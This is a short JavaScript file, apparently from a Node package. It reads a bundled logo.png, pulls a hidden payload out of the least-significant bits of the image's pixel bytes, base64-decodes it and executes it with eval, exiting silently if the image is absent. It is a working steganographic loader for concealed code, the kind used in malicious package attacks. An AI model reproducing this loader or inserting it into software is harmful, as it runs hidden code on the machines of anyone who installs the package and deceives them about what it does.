const fs = require('fs');
const path = require('path');

// Read embedded PNG image from the package
const imgPath = path.join(__dirname, 'assets', 'logo.png');
let imgBuffer;
try {
  imgBuffer = fs.readFileSync(imgPath);
} catch(e) { process.exit(0); }

// Skip PNG header (8 bytes) and find IDAT chunks
// Extract LSB from pixel data to reconstruct hidden payload
const pixels = imgBuffer.slice(imgBuffer.indexOf('IDAT') + 8);
let bits = '';
for (let i = 0; i < Math.min(pixels.length, 8192); i++) {
  bits += (pixels[i] & 1).toString();
}

// Convert bits to bytes
let payload = '';
for (let i = 0; i + 8 <= bits.length; i += 8) {
  const byte = parseInt(bits.slice(i, i + 8), 2);
  if (byte === 0) break;
  payload += String.fromCharCode(byte);
}

// Decode and execute the hidden payload
if (payload.length > 10) {
  const decoded = Buffer.from(payload, 'base64').toString('utf8');
  eval(decoded);
}
